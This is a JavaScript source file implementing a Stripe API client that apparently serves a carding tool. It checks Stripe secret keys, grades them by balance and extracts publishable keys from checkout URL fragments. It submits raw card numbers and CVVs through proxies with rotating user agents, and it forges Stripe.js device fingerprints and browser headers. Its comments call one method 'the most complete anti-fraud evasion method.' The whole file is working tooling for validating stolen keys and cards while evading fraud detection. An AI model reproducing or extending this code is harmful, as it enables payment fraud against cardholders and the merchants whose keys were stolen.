import axios from 'axios';
import { v4 as uuidv4 } from 'uuid';
import { IStripeAPIClient } from '../../interfaces/IStripeAPIClient.js';
import { proxyAgentFactory } from '../http/ProxyAgentFactory.js';
import { retryHandler } from '../http/RetryHandler.js';
import { STRIPE_API } from '../../utils/constants.js';
import { getRandomAPIUserAgent, generateStripeIds, getRandomTimeOnPage } from '../../utils/helpers.js';
import { fakeDataService } from '../../utils/FakeDataService.js';

/**
 * Stripe API Client
 * Implements IStripeAPIClient interface
 * Handles all direct Stripe API communications
 */
export class StripeAPIClient extends IStripeAPIClient {
    constructor(options = {}) {
        super();
        this.proxyFactory = options.proxyFactory || proxyAgentFactory;
        this.retry = options.retryHandler || retryHandler;
        
        // Cache for key checks (SK -> result)
        this.keyCache = new Map();
        this.keyCacheTTL = 5 * 60 * 1000; // 5 minutes
    }

    /**
     * Get cached key info or null
     */
    _getCachedKey(skKey) {
        const cached = this.keyCache.get(skKey);
        if (cached && Date.now() - cached.timestamp < this.keyCacheTTL) {
            return cached.data;
        }
        this.keyCache.delete(skKey);
        return null;
    }

    /**
     * Cache key info
     */
    _cacheKey(skKey, data) {
        // Limit cache size
        if (this.keyCache.size > 100) {
            const oldest = this.keyCache.keys().next().value;
            this.keyCache.delete(oldest);
        }
        this.keyCache.set(skKey, { data, timestamp: Date.now() });
    }

    /**
     * Create axios config with authentication
     * @private
     */
    _createConfig(skKey, proxy = null) {
        const config = {
            headers: {
                'Authorization': `Bearer ${skKey}`,
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': getRandomAPIUserAgent(),
                'Accept': 'application/json',
                'Accept-Language': 'en-US,en;q=0.9',
            }
        };
        return this.proxyFactory.createAxiosConfig(proxy, config);
    }

    /**
     * Create axios config with Basic auth
     * @private
     */
    _createBasicAuthConfig(skKey, proxy = null) {
        const config = {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            auth: { username: skKey, password: '' }
        };
        return this.proxyFactory.createAxiosConfig(proxy, config);
    }

    /**
     * Get default address using FakeDataService
     * @private
     */
    _getDefaultAddress() {
        return fakeDataService.generateAddress();
    }

    /**
     * Check Stripe SK key validity and get account info
     * @param {string} skKey - Stripe secret key
     * @param {Object} proxy - Optional proxy configuration { host, port, type, username, password }
     */
    async checkKey(skKey, proxy = null) {
        // Check cache first
        const cached = this._getCachedKey(skKey);
        if (cached) return cached;

        const headers = { 'Authorization': `Bearer ${skKey}` };
        
        // Create axios config with optional proxy
        const axiosConfig = proxy 
            ? this.proxyFactory.createAxiosConfig(proxy, { headers })
            : { headers };

        // Get balance
        const balanceRes = await axios.get(STRIPE_API.BALANCE, axiosConfig);
        const balanceData = balanceRes.data;

        if (balanceData.error) {
            return { status: 'DEAD', message: balanceData.error.message };
        }

        // Get account info (use same proxy config)
        const accountRes = await axios.get(STRIPE_API.ACCOUNT, axiosConfig);
        const accountData = accountRes.data;

        // Parse balance
        const available = balanceData.available?.[0] || {};
        const pending = balanceData.pending?.[0] || {};
        const availableAmount = available.amount || 0;
        const pendingAmount = pending.amount || 0;
        const currency = available.currency || accountData.default_currency || 'usd';
        const livemode = balanceData.livemode;

        // Parse capabilities
        const capabilities = accountData.capabilities || {};
        const hasCardPayments = capabilities.card_payments === 'active';
        const hasTransfers = capabilities.transfers === 'active';
        const hasCardIssuing = capabilities.card_issuing === 'active';

        // Determine status based on balance
        let status;
        if (availableAmount > 0) status = 'LIVE+';
        else if (availableAmount === 0) status = 'LIVE0';
        else status = 'LIVE-';

        // Determine chargeable status from account capabilities (no card testing)
        const isChargeable = accountData.charges_enabled && hasCardPayments;
        const chargeableVerified = isChargeable;

        // Get country info with flag
        const countryInfo = this._getCountryInfo(accountData.country);

        // Try to get PK key by creating a checkout session and decoding from URL fragment
        let pkKey = null;
        let canMakeLiveCharges = true;
        try {
            // Build checkout config with proxy support
            const checkoutConfig = proxy 
                ? this.proxyFactory.createAxiosConfig(proxy, {
                    headers: {
                        ...headers,
                        'Content-Type': 'application/x-www-form-urlencoded'
                    }
                })
                : {
                    headers: {
                        ...headers,
                        'Content-Type': 'application/x-www-form-urlencoded'
                    }
                };
            
            const checkoutRes = await axios.post(STRIPE_API.CHECKOUT_SESSIONS,
                new URLSearchParams({
                    'mode': 'setup',
                    'success_url': 'https://example.com/success',
                    'cancel_url': 'https://example.com/cancel',
                    'payment_method_types[]': 'card'
                }).toString(),
                checkoutConfig
            );

            if (checkoutRes.data?.url) {
                const checkoutUrl = checkoutRes.data.url;
                
                // Extract pk_live from URL fragment (XOR encoded with key 5)
                if (checkoutUrl.includes('#')) {
                    const fragment = checkoutUrl.split('#')[1];
                    const decoded = this._decodeStripeFragment(fragment);
                    
                    // Search for pk_live in decoded fragment
                    const pkMatch = decoded.match(/pk_(live|test)_[a-zA-Z0-9_]+/);
                    if (pkMatch) {
                        pkKey = pkMatch[0];
                    }
                }
                
                // Fallback: fetch the page and search for pk_live
                if (!pkKey) {
                    try {
                        const pageConfig = proxy 
                            ? this.proxyFactory.createAxiosConfig(proxy, {
                                headers: { 
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                                },
                                maxRedirects: 5
                            })
                            : {
                                headers: { 
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                                },
                                maxRedirects: 5
                            };
                        const pageRes = await axios.get(checkoutUrl, pageConfig);
                        
                        const html = pageRes.data;
                        
                        // Try multiple patterns
                        let pkMatch = html.match(/pk_(live|test)_[a-zA-Z0-9_]+/);
                        if (pkMatch) {
                            pkKey = pkMatch[0];
                        }
                        
                        if (!pkKey) {
                            pkMatch = html.match(/"publishableKey"\s*:\s*"(pk_(?:live|test)_[a-zA-Z0-9_]+)"/);
                            if (pkMatch) {
                                pkKey = pkMatch[1];
                            }
                        }
                    } catch (e) {
                        // Fallback failed
                    }
                }
            }
        } catch (e) {
            const errorMessage = e.response?.data?.error?.message || e.message;

            // If account cannot make live charges, treat as DEAD
            if (errorMessage.includes('cannot currently make live charges')) {
                canMakeLiveCharges = false;
            }
        }

        // If account cannot make live charges, return DEAD status
        if (!canMakeLiveCharges) {
            return {
                status: 'DEAD',
                message: 'Account cannot make live charges',
                accountEmail: accountData.email || 'N/A',
                country: accountData.country || 'N/A',
                countryName: this._getCountryInfo(accountData.country).name,
                countryFlag: this._getCountryInfo(accountData.country).flag,
            };
        }

        const result = {
            status,
            type: livemode ? 'LIVE' : 'TEST',
            accountId: accountData.id || 'N/A',
            accountName: accountData.business_profile?.name || accountData.settings?.dashboard?.display_name || 'N/A',
            accountEmail: accountData.email || 'N/A',
            country: accountData.country || 'N/A',
            countryName: countryInfo.name,
            countryFlag: countryInfo.flag,
            defaultCurrency: (accountData.default_currency || 'usd').toUpperCase(),
            currency: currency.toUpperCase(),
            currencySymbol: this._getCurrencySymbol(currency),
            availableBalance: availableAmount,
            pendingBalance: pendingAmount,
            chargesEnabled: accountData.charges_enabled || false,
            payoutsEnabled: accountData.payouts_enabled || false,
            isChargeable,
            chargeableVerified,
            capabilities: {
                cardPayments: hasCardPayments,
                transfers: hasTransfers,
                cardIssuing: hasCardIssuing
            },
            pkKey,
            livemode
        };

        // Cache the result
        this._cacheKey(skKey, result);
        return result;
    }

    /**
     * Decode Stripe URL fragment to extract pk_live key
     * Steps: URL decode → Base64 decode (URL-safe) → XOR with key 5
     * @private
     */
    _decodeStripeFragment(encodedFragment) {
        try {
            // Step 1: URL decode
            const urlDecoded = decodeURIComponent(encodedFragment);
            
            // Step 2: Base64 decode (URL-safe)
            // Replace URL-safe chars and add padding
            let base64 = urlDecoded
                .replace(/-/g, '+')
                .replace(/_/g, '/');
            
            // Add padding if needed
            const padding = 4 - (base64.length % 4);
            if (padding !== 4) {
                base64 += '='.repeat(padding);
            }
            
            // Decode base64 to bytes
            const binaryStr = Buffer.from(base64, 'base64');
            
            // Step 3: XOR with key 5
            const decoded = Buffer.alloc(binaryStr.length);
            for (let i = 0; i < binaryStr.length; i++) {
                decoded[i] = binaryStr[i] ^ 5;
            }
            
            return decoded.toString('utf8');
        } catch (e) {

            return '';
        }
    }

    /**
     * Get country info with flag emoji
     * @private
     */
    _getCountryInfo(countryCode) {
        const countries = {
            'US': { name: 'United States', flag: '🇺🇸' },
            'GB': { name: 'United Kingdom', flag: '🇬🇧' },
            'CA': { name: 'Canada', flag: '🇨🇦' },
            'AU': { name: 'Australia', flag: '🇦🇺' },
            'DE': { name: 'Germany', flag: '🇩🇪' },
            'FR': { name: 'France', flag: '🇫🇷' },
            'JP': { name: 'Japan', flag: '🇯🇵' },
            'IN': { name: 'India', flag: '🇮🇳' },
            'SG': { name: 'Singapore', flag: '🇸🇬' },
            'NZ': { name: 'New Zealand', flag: '🇳🇿' },
            'AE': { name: 'United Arab Emirates', flag: '🇦🇪' },
            'MX': { name: 'Mexico', flag: '🇲🇽' },
            'BR': { name: 'Brazil', flag: '🇧🇷' },
            'NL': { name: 'Netherlands', flag: '🇳🇱' },
            'ES': { name: 'Spain', flag: '🇪🇸' },
            'IT': { name: 'Italy', flag: '🇮🇹' },
            'SE': { name: 'Sweden', flag: '🇸🇪' },
            'CH': { name: 'Switzerland', flag: '🇨🇭' },
            'AT': { name: 'Austria', flag: '🇦🇹' },
            'BE': { name: 'Belgium', flag: '🇧🇪' },
            'DK': { name: 'Denmark', flag: '🇩🇰' },
            'FI': { name: 'Finland', flag: '🇫🇮' },
            'IE': { name: 'Ireland', flag: '🇮🇪' },
            'NO': { name: 'Norway', flag: '🇳🇴' },
            'PL': { name: 'Poland', flag: '🇵🇱' },
            'PT': { name: 'Portugal', flag: '🇵🇹' },
            'HK': { name: 'Hong Kong', flag: '🇭🇰' },
            'MY': { name: 'Malaysia', flag: '🇲🇾' },
            'TH': { name: 'Thailand', flag: '🇹🇭' },
            'PH': { name: 'Philippines', flag: '🇵🇭' },
        };
        return countries[countryCode] || { name: countryCode || 'Unknown', flag: '🌍' };
    }

    /**
     * Get currency symbol
     * @private
     */
    _getCurrencySymbol(currency) {
        const symbols = {
            'usd': '$', 'eur': '€', 'gbp': '£', 'jpy': '¥', 'cad': 'C$',
            'aud': 'A$', 'inr': '₹', 'sgd': 'S$', 'nzd': 'NZ$', 'aed': 'د.إ',
            'mxn': '$', 'brl': 'R$', 'chf': 'CHF', 'sek': 'kr', 'nok': 'kr',
            'dkk': 'kr', 'pln': 'zł', 'hkd': 'HK$', 'thb': '฿', 'php': '₱',
            'myr': 'RM'
        };
        return symbols[currency?.toLowerCase()] || currency?.toUpperCase() || '$';
    }

    /**
     * Create a PaymentIntent (unconfirmed) - for browser/API confirmation
     * Returns client_secret for use with stripe.confirmCardPayment()
     */
    async createPaymentIntentUnconfirmed(skKey, params, proxy = null) {
        const { amount, currency = 'usd' } = params;
        
        const formData = new URLSearchParams({
            'amount': amount.toString(),
            'currency': currency,
            'payment_method_types[]': 'card',
            'capture_method': 'automatic',
        });

        const config = this._createConfig(skKey, proxy);
        const response = await axios.post(STRIPE_API.PAYMENT_INTENTS, formData.toString(), config);
        return response.data;
    }

    /**
     * Retrieve a PaymentIntent with expanded charge data
     */
    async retrievePaymentIntent(skKey, intentId, proxy = null) {
        const formData = new URLSearchParams();
        formData.append('expand[]', 'latest_charge');
        formData.append('expand[]', 'latest_charge.outcome');
        formData.append('expand[]', 'latest_charge.payment_method_details');

        const config = this._createConfig(skKey, proxy);
        const response = await axios.get(
            `${STRIPE_API.PAYMENT_INTENTS}/${intentId}?${formData.toString()}`, 
            config
        );
        return response.data;
    }

    /**
     * Create a PaymentIntent
     */
    async createPaymentIntent(skKey, params, proxy = null) {
        const { 
            amount, 
            currency = 'usd', 
            paymentMethod, 
            customer,
            confirm = false, 
            captureMethod = 'automatic',
            offSession = false
        } = params;
        
        const formData = new URLSearchParams({
            'amount': amount.toString(),
            'currency': currency,
            'payment_method_types[]': 'card',
            'capture_method': captureMethod,
        });
        
        // Expand to get full charge data including Radar risk assessment
        // This also helps get risk data on declined charges
        formData.append('expand[]', 'latest_charge');
        formData.append('expand[]', 'latest_charge.outcome');
        formData.append('expand[]', 'latest_charge.balance_transaction');

        if (customer) {
            formData.append('customer', customer);
        }
        if (paymentMethod) {
            formData.append('payment_method', paymentMethod);
        }
        if (confirm) {
            formData.append('confirm', 'true');
            formData.append('return_url', 'https://example.com/complete');
        }
        if (offSession) {
            // Merchant-initiated transaction on saved card - lower risk
            formData.append('off_session', 'true');
        }

        const config = this._createConfig(skKey, proxy);
        const response = await axios.post(STRIPE_API.PAYMENT_INTENTS, formData.toString(), config);
        return response.data;
    }

    /**
     * Confirm a PaymentIntent
     */
    async confirmPaymentIntent(skKey, intentId, paymentMethod, proxy = null) {
        const formData = new URLSearchParams({
            'return_url': 'https://example.com/complete',
            'use_stripe_sdk': 'true'
        });

        // Support different payment method types
        if (paymentMethod.startsWith('src_')) {
            formData.append('source', paymentMethod);
        } else if (paymentMethod.startsWith('tok_')) {
            formData.append('payment_method_data[type]', 'card');
            formData.append('payment_method_data[card][token]', paymentMethod);
        } else {
            formData.append('payment_method', paymentMethod);
        }

        const config = this._createConfig(skKey, proxy);
        const response = await axios.post(`${STRIPE_API.PAYMENT_INTENTS}/${intentId}/confirm`, formData.toString(), config);
        return response.data;
    }

    /**
     * Cancel a PaymentIntent
     */
    async cancelPaymentIntent(skKey, intentId, proxy = null) {
        const config = this._createConfig(skKey, proxy);
        const response = await axios.post(`${STRIPE_API.PAYMENT_INTENTS}/${intentId}/cancel`, '', config);
        return response.data;
    }

    /**
     * Refund a charge
     */
    async refund(skKey, chargeId, proxy = null) {
        const formData = new URLSearchParams({ 'charge': chargeId });
        const config = this._createConfig(skKey, proxy);
        const response = await axios.post(STRIPE_API.REFUNDS, formData.toString(), config);
        return response.data;
    }

    /**
     * Create a customer
     */
    async createCustomer(skKey, params, proxy = null) {
        const { email, description, address, source } = params;
        
        const formData = new URLSearchParams();
        if (email) formData.append('email', email);
        if (description) formData.append('description', description);
        if (source) formData.append('source', source);
        
        if (address) {
            const defaultAddress = this._getDefaultAddress();
            formData.append('address[line1]', address.line1 || defaultAddress.line1);
            formData.append('address[city]', address.city || defaultAddress.city);
            formData.append('address[state]', address.state || defaultAddress.state);
            formData.append('address[postal_code]', address.postalCode || defaultAddress.postalCode);
            formData.append('address[country]', address.country || defaultAddress.country);
        }

        const config = this._createBasicAuthConfig(skKey, proxy);
        const response = await axios.post(STRIPE_API.CUSTOMERS, formData.toString(), config);
        return response.data;
    }

    /**
     * Create a SetupIntent with card data
     */
    async createSetupIntent(skKey, params, proxy = null) {
        const { customerId, cardData, usage = 'off_session' } = params;
        
        const formData = new URLSearchParams({
            'customer': customerId,
            'usage': usage,
            'payment_method_data[type]': 'card',
            'payment_method_data[card][number]': cardData.number,
            'payment_method_data[card][exp_month]': cardData.expMonth,
            'payment_method_data[card][exp_year]': cardData.expYear,
            'payment_method_data[card][cvc]': cardData.cvv
        });

        const config = this._createBasicAuthConfig(skKey, proxy);
        const response = await axios.post(STRIPE_API.SETUP_INTENTS, formData.toString(), config);
        return response.data;
    }

    /**
     * Create a SetupIntent for client-side confirmation (best for CVV check)
     * Returns client_secret for Stripe.js confirmCardSetup
     */
    async createSetupIntentForClient(skKey, params = {}, proxy = null) {
        const { customerId, usage = 'off_session', paymentMethodTypes = ['card'] } = params;
        
        const formData = new URLSearchParams({
            'usage': usage,
            'automatic_payment_methods[enabled]': 'false'
        });

        // Add payment method types
        paymentMethodTypes.forEach(type => {
            formData.append('payment_method_types[]', type);
        });

        if (customerId) {
            formData.append('customer', customerId);
        }

        const config = this._createConfig(skKey, proxy);
        const response = await axios.post(STRIPE_API.SETUP_INTENTS, formData.toString(), config);
        return response.data;
    }

    /**
     * Confirm a SetupIntent with PaymentMethod
     */
    async confirmSetupIntent(skKey, setupIntentId, paymentMethodId, proxy = null) {
        const formData = new URLSearchParams({
            'payment_method': paymentMethodId,
            'return_url': 'https://example.com/complete'
        });

        const config = this._createConfig(skKey, proxy);
        const response = await axios.post(`${STRIPE_API.SETUP_INTENTS}/${setupIntentId}/confirm`, formData.toString(), config);
        return response.data;
    }

    /**
     * Confirm a SetupIntent with raw card data using PK (mimics Stripe.js confirmCardSetup)
     * This bypasses the "integration surface unsupported" error by using the client_secret flow
     */
    async confirmSetupIntentWithCard(pkKey, clientSecret, cardData, billingDetails = {}, proxy = null) {
        const { guid, muid, sid } = generateStripeIds();
        const timeOnPage = getRandomTimeOnPage();
        
        const formData = new URLSearchParams({
            'payment_method_data[type]': 'card',
            'payment_method_data[card][number]': cardData.number,
            'payment_method_data[card][cvc]': cardData.cvv,
            'payment_method_data[card][exp_month]': cardData.expMonth,
            'payment_method_data[card][exp_year]': cardData.expYear,
            'payment_method_data[guid]': guid,
            'payment_method_data[muid]': muid,
            'payment_method_data[payment_user_agent]': 'stripe.js/aacd964e31; stripe-js-v3/aacd964e31',
            'payment_method_data[time_on_page]': timeOnPage.toString(),
            'payment_method_data[pasted_fields]': 'number',
            'expected_payment_method_type': 'card',
            'return_url': 'https://example.com/complete',
            'use_stripe_sdk': 'true',
            'key': pkKey,
            'client_secret': clientSecret
        });

        // Add billing details if provided
        if (billingDetails.name) {
            formData.append('payment_method_data[billing_details][name]', billingDetails.name);
        }
        if (billingDetails.email) {
            formData.append('payment_method_data[billing_details][email]', billingDetails.email);
        }
        if (billingDetails.address) {
            const addr = billingDetails.address;
            if (addr.country) formData.append('payment_method_data[billing_details][address][country]', addr.country);
            if (addr.postal_code) formData.append('payment_method_data[billing_details][address][postal_code]', addr.postal_code);
        }

        const config = {
            headers: {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': getRandomAPIUserAgent()
            }
        };

        const axiosConfig = this.proxyFactory.createAxiosConfig(proxy, config);
        
        // Extract SetupIntent ID from client_secret (format: seti_xxx_secret_yyy)
        const setupIntentId = clientSecret.split('_secret_')[0];
        
        const response = await axios.post(
            `${STRIPE_API.SETUP_INTENTS}/${setupIntentId}/confirm`, 
            formData.toString(), 
            axiosConfig
        );
        return response.data;
    }

    /**
     * Confirm a PaymentIntent with raw card data using PK (mimics Stripe.js confirmCardPayment)
     */
    async confirmPaymentIntentWithCard(pkKey, clientSecret, cardData, billingDetails = {}, proxy = null) {
        const { guid, muid, sid } = generateStripeIds();
        const timeOnPage = getRandomTimeOnPage();
        
        const formData = new URLSearchParams({
            'payment_method_data[type]': 'card',
            'payment_method_data[card][number]': cardData.number,
            'payment_method_data[card][cvc]': cardData.cvv,
            'payment_method_data[card][exp_month]': cardData.expMonth,
            'payment_method_data[card][exp_year]': cardData.expYear,
            'payment_method_data[guid]': guid,
            'payment_method_data[muid]': muid,
            'payment_method_data[payment_user_agent]': 'stripe.js/aacd964e31; stripe-js-v3/aacd964e31',
            'payment_method_data[time_on_page]': timeOnPage.toString(),
            'payment_method_data[pasted_fields]': 'number',
            'expected_payment_method_type': 'card',
            'return_url': 'https://example.com/complete',
            'use_stripe_sdk': 'true',
            'key': pkKey,
            'client_secret': clientSecret
        });

        // Add billing details if provided
        if (billingDetails.name) {
            formData.append('payment_method_data[billing_details][name]', billingDetails.name);
        }

        const config = {
            headers: {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': getRandomAPIUserAgent()
            }
        };

        const axiosConfig = this.proxyFactory.createAxiosConfig(proxy, config);
        
        // Extract PaymentIntent ID from client_secret (format: pi_xxx_secret_yyy)
        const paymentIntentId = clientSecret.split('_secret_')[0];
        
        const response = await axios.post(
            `${STRIPE_API.PAYMENT_INTENTS}/${paymentIntentId}/confirm`, 
            formData.toString(), 
            axiosConfig
        );
        return response.data;
    }

    /**
     * Confirm PaymentIntent with full Stripe.js fingerprinting (matches real browser flow)
     * This is the most complete anti-fraud evasion method
     * 
     * @param {string} pkKey - Publishable key
     * @param {string} clientSecret - PaymentIntent client_secret
     * @param {Object} cardData - { number, expMonth, expYear, cvv }
     * @param {Object} options - { referrer, billingDetails, postalCode, country }
     * @param {string} proxy - Optional proxy
     * @returns {Promise<Object>} - PaymentIntent confirmation response
     */
    async confirmPaymentIntentWithFingerprint(pkKey, clientSecret, cardData, options = {}, proxy = null) {
        const { guid, muid, sid } = generateStripeIds();
        const timeOnPage = getRandomTimeOnPage();
        const sessionId = uuidv4();
        const elementsSessionId = uuidv4();
        const referrer = options.referrer || 'https://checkout.stripe.com';
        
        const formData = new URLSearchParams();
        
        // Return URL (required)
        formData.append('return_url', options.returnUrl || referrer);
        
        // Card data
        formData.append('payment_method_data[type]', 'card');
        formData.append('payment_method_data[card][number]', cardData.number);
        formData.append('payment_method_data[card][cvc]', cardData.cvv);
        formData.append('payment_method_data[card][exp_year]', String(cardData.expYear).slice(-2));
        formData.append('payment_method_data[card][exp_month]', String(cardData.expMonth).padStart(2, '0'));
        formData.append('payment_method_data[allow_redisplay]', 'unspecified');
        
        // Billing details
        if (options.postalCode) {
            formData.append('payment_method_data[billing_details][address][postal_code]', options.postalCode);
        }
        formData.append('payment_method_data[billing_details][address][country]', options.country || 'US');
        if (options.billingDetails?.name) {
            formData.append('payment_method_data[billing_details][name]', options.billingDetails.name);
        }
        
        // Minimal Stripe.js fingerprinting - avoid client_attribution_metadata that triggers autopm check
        formData.append('payment_method_data[payment_user_agent]', 'stripe.js/v3');
        formData.append('payment_method_data[referrer]', referrer);
        formData.append('payment_method_data[time_on_page]', timeOnPage.toString());
        formData.append('payment_method_data[pasted_fields]', 'number');
        
        // Device fingerprinting IDs
        formData.append('payment_method_data[guid]', guid);
        formData.append('payment_method_data[muid]', muid);
        formData.append('payment_method_data[sid]', sid);
        
        // Expected payment method type
        formData.append('expected_payment_method_type', 'card');
        
        // Client context
        formData.append('client_context[currency]', options.currency || 'usd');
        formData.append('client_context[mode]', 'payment');
        
        // Use Stripe SDK
        formData.append('use_stripe_sdk', 'true');
        
        // Key and client secret
        formData.append('key', pkKey);
        
        // Client secret
        formData.append('client_secret', clientSecret);
        
        // Headers matching real Stripe.js requests
        const config = {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0',
                'Accept': 'application/json',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Referer': 'https://js.stripe.com/',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://js.stripe.com',
                'Connection': 'keep-alive',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'Priority': 'u=4'
            }
        };

        const axiosConfig = this.proxyFactory.createAxiosConfig(proxy, config);
        
        // Extract PaymentIntent ID from client_secret
        const paymentIntentId = clientSecret.split('_secret_')[0];
        
        const response = await axios.post(
            `${STRIPE_API.PAYMENT_INTENTS}/${paymentIntentId}/confirm`, 
            formData.toString(), 
            axiosConfig
        );
        return response.data;
    }

    /**
     * Cancel a SetupIntent
     */
    async cancelSetupIntent(skKey, setupIntentId, proxy = null) {
        const config = this._createConfig(skKey, proxy);
        const response = await axios.post(`${STRIPE_API.SETUP_INTENTS}/${setupIntentId}/cancel`, '', config);
        return response.data;
    }

    /**
     * Get SetupIntent details
     */
    async getSetupIntent(skKey, setupIntentId, proxy = null) {
        const config = this._createConfig(skKey, proxy);
        const response = await axios.get(`${STRIPE_API.SETUP_INTENTS}/${setupIntentId}`, config);
        return response.data;
    }

    /**
     * Attach a PaymentMethod to a Customer
     */
    async attachPaymentMethod(skKey, paymentMethodId, customerId, proxy = null) {
        const formData = new URLSearchParams({ 'customer': customerId });
        const config = this._createBasicAuthConfig(skKey, proxy);
        const response = await axios.post(`${STRIPE_API.PAYMENT_METHODS}/${paymentMethodId}/attach`, formData.toString(), config);
        return response.data;
    }

    /**
     * Create a PaymentMethod server-side
     */
    async createPaymentMethod(skKey, cardData, proxy = null) {
        const formData = new URLSearchParams({
            'type': 'card',
            'card[number]': cardData.number,
            'card[exp_month]': cardData.expMonth,
            'card[exp_year]': cardData.expYear,
            'card[cvc]': cardData.cvv
        });

        const config = this._createConfig(skKey, proxy);
        const response = await axios.post(STRIPE_API.PAYMENT_METHODS, formData.toString(), config);
        return response.data;
    }

    /**
     * Create a token using publishable key (mimics Stripe.js)
     */
    async createTokenWithPK(pkKey, cardData, proxy = null) {
        const { guid, muid, sid } = generateStripeIds();
        const timeOnPage = getRandomTimeOnPage();
        
        const formData = new URLSearchParams({
            'card[number]': cardData.number,
            'card[cvc]': cardData.cvv,
            'card[exp_month]': cardData.expMonth,
            'card[exp_year]': cardData.expYear,
            'guid': guid,
            'muid': muid,
            'sid': sid,
            'pasted_fields': 'number',
            'payment_user_agent': 'stripe.js/v3',
            'time_on_page': timeOnPage.toString(),
            'key': pkKey
        });

        const config = {
            headers: {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': getRandomAPIUserAgent()
            }
        };

        const axiosConfig = this.proxyFactory.createAxiosConfig(proxy, config);
        const response = await axios.post(STRIPE_API.TOKENS, formData.toString(), axiosConfig);
        return response.data;
    }

    /**
     * Create a source using SK key with raw card data
     */
    async createSource(skKey, cardData, proxy = null) {
        const formData = new URLSearchParams({
            'type': 'card',
            'owner[name]': 'Cardholder',
            'card[number]': cardData.number,
            'card[exp_month]': cardData.expMonth,
            'card[exp_year]': cardData.expYear,
            'card[cvc]': cardData.cvv
        });

        const config = this._createBasicAuthConfig(skKey, proxy);
        const response = await axios.post(STRIPE_API.SOURCES, formData.toString(), config);
        return response.data;
    }

    /**
     * Create a charge
     */
    async createCharge(skKey, params, proxy = null) {
        const { amount, currency = 'usd', customerId, source } = params;
        
        const formData = new URLSearchParams({
            'amount': amount.toString(),
            'currency': currency
        });
        
        if (customerId) formData.append('customer', customerId);
        if (source) formData.append('source', source);

        const config = this._createBasicAuthConfig(skKey, proxy);
        const response = await axios.post(STRIPE_API.CHARGES, formData.toString(), config);
        return response.data;
    }

    /**
     * Create a Checkout Session
     */
    async createCheckoutSession(skKey, params, proxy = null) {
        const { mode = 'setup', successUrl, cancelUrl } = params;
        
        const formData = new URLSearchParams({
            'mode': mode,
            'success_url': successUrl || 'https://example.com/success?session_id={CHECKOUT_SESSION_ID}',
            'cancel_url': cancelUrl || 'https://example.com/cancel',
            'payment_method_types[]': 'card'
        });

        const config = this._createConfig(skKey, proxy);
        const response = await axios.post(STRIPE_API.CHECKOUT_SESSIONS, formData.toString(), config);
        return response.data;
    }

    /**
     * Get Checkout Session
     */
    async getCheckoutSession(skKey, sessionId, expand = [], proxy = null) {
        let url = `${STRIPE_API.CHECKOUT_SESSIONS}/${sessionId}`;
        if (expand.length > 0) {
            const expandParams = expand.map(e => `expand[]=${e}`).join('&');
            url += `?${expandParams}`;
        }

        const config = this._createConfig(skKey, proxy);
        const response = await axios.get(url, config);
        return response.data;
    }

    /**
     * Create a Checkout Session for setup mode (save card to customer)
     * Returns URL for Stripe hosted checkout page
     * 
     * @param {string} skKey - Stripe secret key
     * @param {Object} params - customerId (optional), customerEmail, successUrl, cancelUrl
     * @param {string} proxy - Optional proxy
     * @returns {Promise<Object>} - { id, url, customer }
     */
    async createSetupCheckoutSession(skKey, params, proxy = null) {
        const { customerId, customerEmail, successUrl, cancelUrl, metadata } = params;
        
        const formData = new URLSearchParams({
            'mode': 'setup',
            'success_url': successUrl || 'https://example.com/success?session_id={CHECKOUT_SESSION_ID}',
            'cancel_url': cancelUrl || 'https://example.com/cancel',
            'payment_method_types[]': 'card'
        });

        // Attach to existing customer or create new one
        if (customerId) {
            formData.append('customer', customerId);
        } else if (customerEmail) {
            formData.append('customer_email', customerEmail);
        }

        // Add metadata if provided
        if (metadata) {
            Object.entries(metadata).forEach(([key, value]) => {
                formData.append(`metadata[${key}]`, value);
            });
        }

        const config = this._createConfig(skKey, proxy);
        const response = await axios.post(STRIPE_API.CHECKOUT_SESSIONS, formData.toString(), config);
        return response.data;
    }

    /**
     * Create a Checkout Session for payment mode (one-time charge)
     * Returns URL for Stripe hosted checkout page
     */
    async createPaymentCheckoutSession(skKey, params, proxy = null) {
        const { amount, currency = 'usd', productName, customerId, customerEmail, successUrl, cancelUrl, metadata } = params;
        
        const formData = new URLSearchParams({
            'mode': 'payment',
            'success_url': successUrl || 'https://example.com/success?session_id={CHECKOUT_SESSION_ID}',
            'cancel_url': cancelUrl || 'https://example.com/cancel',
            'payment_method_types[]': 'card',
            'line_items[0][price_data][currency]': currency,
            'line_items[0][price_data][product_data][name]': productName || 'Validation Charge',
            'line_items[0][price_data][unit_amount]': amount.toString(),
            'line_items[0][quantity]': '1'
        });

        if (customerId) {
            formData.append('customer', customerId);
        } else if (customerEmail) {
            formData.append('customer_email', customerEmail);
        }

        if (metadata) {
            Object.entries(metadata).forEach(([key, value]) => {
                formData.append(`metadata[${key}]`, value);
            });
        }

        const config = this._createConfig(skKey, proxy);
        const response = await axios.post(STRIPE_API.CHECKOUT_SESSIONS, formData.toString(), config);
        return response.data;
    }
}

// Export singleton
export const stripeAPIClient = new StripeAPIClient();
